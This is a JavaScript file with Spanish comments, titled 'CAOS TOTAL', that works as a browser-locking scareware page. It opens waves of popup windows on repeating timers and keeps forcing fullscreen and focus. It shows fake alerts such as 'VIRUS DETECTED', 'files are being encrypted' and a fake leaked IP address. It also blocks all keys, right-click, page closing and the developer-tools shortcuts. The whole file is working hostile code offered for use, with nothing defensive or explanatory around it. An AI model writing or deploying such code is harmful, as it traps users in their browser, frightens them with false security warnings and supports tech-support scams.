// ================================================================
// YOU.JS — CAOS TOTAL v2.0
// ================================================================

// === CONFIGURACIÓN DE NIVEL DE CAOS ===
var CHAOS_LEVEL = 999; // Número máximo de spawns simultáneos

// === VARIABLES GLOBALES ===
var popupCount = 0;
var chaosInterval;

// ================================================================
// 1. APERTURA MASIVA DE POPUPS REALES
// ================================================================

function openWindow(url) {
    try {
        var popup = window.open(
            url,
            'popup_' + Math.random().toString(36).substr(2, 10) + '_' + Date.now(),
            'menubar=no,status=no,toolbar=no,resizable=no,scrollbars=no,width=150,height=120,titlebar=no,alwaysRaised=yes'
        );
        if (popup) {
            try { 
                popup.focus();
                popupCount++;
            } catch(e) {}
        }
        return popup;
    } catch(e) { return null; }
}

function procreate() {
    // ABRIR UNA OLEADA MASIVA
    var waveSize = 20 + Math.floor(Math.random() * 30);
    for (var i = 0; i < waveSize; i++) {
        setTimeout(function() { openWindow('open.html'); }, i * 5);
    }
}

// ================================================================
// 2. SPAM DE POPUPS — OLEADAS INFINITAS
// ================================================================

function launchWave() {
    for (var wave = 0; wave < 5; wave++) {
        setTimeout(function() {
            var count = 15 + Math.floor(Math.random() * 25);
            for (var i = 0; i < count; i++) {
                openWindow('open.html');
            }
        }, wave * 100);
    }
}

function infiniteChaos() {
    // Oleadas cada 1.5 segundos
    chaosInterval = setInterval(function() {
        // Oleada principal
        launchWave();
        
        // Refuerzo aleatorio
        if (Math.random() > 0.5) {
            for (var i = 0; i < 10; i++) {
                openWindow('open.html?rand=' + Math.random());
            }
        }
    }, 1500);
    
    // Primera oleada inmediata
    launchWave();
    launchWave();
    
    // Refuerzo cada 200ms durante los primeros 10 segundos
    var hardRain = setInterval(function() {
        openWindow('open.html');
        openWindow('open.html');
        openWindow('open.html');
    }, 200);
    
    setTimeout(function() { clearInterval(hardRain); }, 10000);
}

// ================================================================
// 3. FULLSCREEN + ENFOQUE FORZADO
// ================================================================

function initFullscreen() {
    forceFullscreen();
    startFighters();
    launchVisualChaos();
    infiniteChaos();
    blockEverything();
    
    // Bucle de mantener fullscreen
    setInterval(forceFullscreen, 500);
}

function forceFullscreen() {
    try {
        var el = document.documentElement;
        var rfs = el.requestFullscreen || el.webkitRequestFullscreen || 
                  el.mozRequestFullScreen || el.msRequestFullscreen;
        if (rfs && !document.fullscreenElement && !document.webkitFullscreenElement) {
            rfs.call(el);
        }
    } catch(e) {}
    
    // Mantener foco constantemente
    try { window.focus(); } catch(e) {}
}

// ================================================================
// 4. CAOS VISUAL — ELEMENTOS FLOTANTES FALSOS
// ================================================================

function createFakePopup() {
    var div = document.createElement('div');
    div.className = 'fake-popup';
    div.innerHTML = '⚠ VIRUS DETECTED ⚠<br>CLICK TO REMOVE';
    div.style.left = Math.random() * (window.innerWidth - 200) + 'px';
    div.style.top = Math.random() * (window.innerHeight - 150) + 'px';
    div.style.background = ['#fff', '#ff0', '#f00', '#0f0', '#00f', '#f0f'][Math.floor(Math.random() * 6)];
    div.style.color = ['#000', '#fff', '#ff0'][Math.floor(Math.random() * 3)];
    div.style.zIndex = 100 + Math.floor(Math.random() * 900);
    
    document.body.appendChild(div);
    
    // Auto-destruirse y reemplazarse
    setTimeout(function() {
        if (div.parentNode) div.parentNode.removeChild(div);
        if (Math.random() > 0.3) createFakePopup();
    }, 2000 + Math.random() * 3000);
}

function createFakeProgress() {
    var div = document.createElement('div');
    div.className = 'fake-progress';
    div.innerHTML = '⚠ SYSTEM SCAN: ' + Math.floor(Math.random() * 999) + ' threats found<br><div class="bar"><div class="bar-fill"></div></div>';
    div.style.left = Math.random() * (window.innerWidth - 300) + 'px';
    div.style.top = Math.random() * (window.innerHeight - 80) + 'px';
    div.style.zIndex = 200 + Math.floor(Math.random() * 800);
    
    document.body.appendChild(div);
    
    setTimeout(function() {
        if (div.parentNode) div.parentNode.removeChild(div);
        if (Math.random() > 0.5) createFakeProgress();
    }, 3000 + Math.random() * 4000);
}

function createFakeAlert() {
    var div = document.createElement('div');
    div.className = 'fake-alert';
    div.innerHTML = '<h3>⚠ CRITICAL ERROR ⚠</h3>' +
        '<p>' + [
            'Your computer has been infected with 999 viruses!',
            'All your files are being encrypted...',
            'WARNING: System memory critically low!',
            'Unauthorized access detected: ' + Math.random().toString(36).substr(2,8).toUpperCase(),
            'Windows has detected a serious threat!',
            'FATAL ERROR: Boot sector corrupted!',
            'Your IP address has been leaked: ' + 
            Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+
            Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255),
        ][Math.floor(Math.random() * 7)] + '</p>' +
        '<button onclick="this.parentNode.style.display=\'none\';createFakeAlert();return false;">OK</button> ' +
        '<button onclick="this.parentNode.style.display=\'none\';createFakeAlert();createFakeAlert();return false;">CANCEL</button>';
    
    div.style.left = Math.random() * (window.innerWidth - 350) + 'px';
    div.style.top = Math.random() * (window.innerHeight - 150) + 'px';
    div.style.zIndex = 300 + Math.floor(Math.random() * 700);
    
    document.body.appendChild(div);
    
    setTimeout(function() {
        if (div.parentNode) div.parentNode.removeChild(div);
        createFakeAlert();
    }, 1500 + Math.random() * 2500);
}

function launchVisualChaos() {
    // Crear olas de elementos visuales falsos
    var visualInterval = setInterval(function() {
        for (var i = 0; i < 5; i++) {
            var r = Math.random();
            if (r < 0.33) createFakePopup();
            else if (r < 0.66) createFakeProgress();
            else createFakeAlert();
        }
    }, 500);
    
    // Oleada inicial masiva
    for (var i = 0; i < 30; i++) {
        setTimeout(function() {
            createFakePopup();
            createFakeProgress();
            createFakeAlert();
        }, i * 50);
    }
}

// ================================================================
// 5. "FIGHTERS" — VENTANAS QUE SE MUEVEN 
// ================================================================

function startFighters() {
    for (var f = 0; f < 20; f++) {
        (function(id) {
            var x = Math.random() * (window.innerWidth - 100);
            var y = Math.random() * (window.innerHeight - 100);
            var dx = (Math.random() - 0.5) * 15;
            var dy = (Math.random() - 0.5) * 15;
            
            var el = document.createElement('div');
            el.className = 'fake-popup';
            el.style.width = '80px';
            el.style.height = '60px';
            el.style.fontSize = '10px';
            el.innerHTML = '⚠' + id + '⚠';
            el.style.left = x + 'px';
            el.style.top = y + 'px';
            document.body.appendChild(el);
            
            function move() {
                if (!el.parentNode) return;
                x += dx;
                y += dy;
                if (x < 0 || x > window.innerWidth - 80) dx *= -1;
                if (y < 0 || y > window.innerHeight - 60) dy *= -1;
                el.style.left = x + 'px';
                el.style.top = y + 'px';
                requestAnimationFrame(move);
            }
            move();
        })(f);
    }
}

// ================================================================
// 6. BLOQUEO TOTAL
// ================================================================

function blockEverything() {
    // Anti-cierre
    window.onbeforeunload = function() { return " "; };
    
    // Bloquear TODAS las teclas
    document.onkeydown = function(e) {
        e = e || window.event;
        e.preventDefault();
        e.stopPropagation();
        return false;
    };
    
    // Bloquear clic derecho
    document.oncontextmenu = function(e) {
        e.preventDefault();
        return false;
    };
    
    // Bloquear selección
    document.onselectstart = function(e) {
        e.preventDefault();
        return false;
    };
    
    // Bloquear arrastre
    document.ondragstart = function(e) {
        e.preventDefault();
        return false;
    };
    
    // Capturar todas las teclas a nivel de window también
    window.onkeydown = function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    };
    
    // Robar foco constantemente
    window.onblur = function() {
        setTimeout(function() {
            try { window.focus(); } catch(e) {}
        }, 1);
    };
}

// ================================================================
// 7. EFECTO DE TORBELLINO CON EL RATÓN
// ================================================================

document.addEventListener('mousemove', function(e) {
    try {
        window.moveTo(
            Math.floor(Math.random() * (screen.width - 300)),
            Math.floor(Math.random() * (screen.height - 200))
        );
    } catch(e) {}
});

// ================================================================
// 8. PREVENIR QUE ABRAN CONSOLA/DEVTOOLS
// ================================================================

// Detectar F12
document.addEventListener('keydown', function(e) {
    if (e.key == 'F12' || (e.ctrlKey && e.shiftKey && (e.key == 'I' || e.key == 'J' || e.key == 'C'))) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});

// ================================================================
// 9. AUTO-REPLICACIÓN — Si detecta que las ventanas disminuyen, las repuebla
// ================================================================

setInterval(function() {
    // Abrir una oleada de refuerzo
    for (var i = 0; i < 8; i++) {
        openWindow('open.html');
    }
}, 3000);
